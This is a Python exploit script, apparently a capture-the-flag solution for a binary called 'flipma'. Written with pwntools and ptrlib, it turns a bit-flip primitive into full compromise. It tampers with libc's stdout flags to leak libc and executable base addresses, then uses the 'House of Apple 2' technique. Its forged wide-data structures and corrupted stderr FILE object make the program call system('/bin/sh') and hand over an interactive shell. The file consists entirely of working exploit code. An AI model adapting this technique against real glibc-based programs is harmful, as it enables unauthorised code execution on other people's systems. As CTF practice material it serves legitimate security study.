#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./flipma_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("localhost", 5000)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    def write_byte(addr: int, data: int, original_data: int = 0):
        assert 0 <= data and data <= 0xFF
        assert 0 <= original_data and original_data <= 0xFF

        offset = addr - unwrap(libc.symbol("_IO_2_1_stdin_"))

        original_bits = [(original_data >> i) & 1 == 1 for i in range(8)]
        for i in range(8):
            original_bit = original_bits[i]
            if original_bit:
                io.sendlineafter(b"a: ", str(offset).encode())
                io.sendlineafter(b"b: ", str(i).encode())

        bits = [(data >> i) & 1 == 1 for i in range(8)]
        for i in range(8):
            bit = bits[i]
            if bit:
                io.sendlineafter(b"a: ", str(offset).encode())
                io.sendlineafter(b"b: ", str(i).encode())

        return

    def write_bytes(addr: int, data: bytes, original_data: bytes = b""):
        if original_data == b"":
            original_data = b"\0" * len(data)
        assert len(data) == len(original_data)

        for i in range(len(data)):
            byte = data[i]
            original_byte = original_data[i]
            write_byte(addr + i, byte, original_byte)

        return

    ################################
    #### libc and exe leak
    ################################
    io.sendlineafter(
        b"a: ", str(0xD20 + 0x1).encode()
    )  # 0xfbad2087 to 0xfbad3887 (_IO_CURRENTLY_PUTTING | _IO_IS_APPENDING)
    io.sendlineafter(b"b: ", str(3).encode())

    io.sendlineafter(b"a: ", str(0xD20 + 0x1).encode())
    io.sendlineafter(b"b: ", str(4).encode())

    io.sendlineafter(b"a: ", str(0xD20 + 0x21).encode())
    io.sendlineafter(b"b: ", str(5).encode())

    io.sendlineafter(b"a: ", str(0xD20 + 0x21).encode())
    io.sendlineafter(b"b: ", str(-1).encode())

    #### libc leak
    io.recv(5)
    libc.base = ptr.u64(io.recv(8)) - 0x157F10

    #### exe leak
    io.recv(0x825 - 5 - 8)
    exe.base = ptr.u64(io.recv(8)) - unwrap(exe.symbol("stdout@@GLIBC_2.2.5"))

    ################################
    #### make `flips` huge
    ################################
    flips = unwrap(exe.symbol("flips"))
    write_byte(flips + 3, 0x70)

    ################################
    #### house of apple 2
    ################################

    #### prepare fake wide_data and wide_vtable
    free_space_base = exe.base + 0x4100
    fake_doallocate_addr = free_space_base + 0x100
    fake_wide_data_addr = fake_doallocate_addr - 8 - 0xE0
    fake_wide_vtable_addr = fake_doallocate_addr - 0x68

    write_bytes(fake_wide_data_addr + 0xE0, ptr.p64(unwrap(fake_wide_vtable_addr)))
    write_bytes(fake_doallocate_addr, ptr.p64(unwrap(libc.symbol("system"))))

    ptr.logger.info(f"&fake_wide_data: {hex(fake_wide_data_addr)}")
    ptr.logger.info(f"&fake_wide_vtable_data: {hex(fake_wide_vtable_addr)}")

    #### tamper stderr
    stderr = unwrap(libc.symbol("_IO_2_1_stderr_"))

    ## flags
    write_bytes(stderr, ptr.p64(0), ptr.p64(0xFBAD2086))
    write_bytes(stderr, b"  /bin/sh;")

    ## write_ptr
    write_bytes(stderr + 0x28, ptr.p64(1))

    ## _wide_data
    write_bytes(stderr + 0xA0, ptr.p64(0), ptr.p64(libc.base + 0x1EC780))
    write_bytes(stderr + 0xA0, ptr.p64(fake_wide_data_addr))

    ## vtable
    write_bytes(stderr + 0xD8, ptr.p64(unwrap(libc.symbol("_IO_file_jumps"))))
    write_bytes(stderr + 0xD8, ptr.p64(unwrap(libc.symbol("_IO_wfile_jumps"))))

    #### trigger system("/bin/sh")
    ## decrease `flips`
    flips = unwrap(exe.symbol("flips"))
    write_byte(flips + 3, 0xFF, 0x6F)

    io.interactive()
    return


if __name__ == "__main__":
    main()
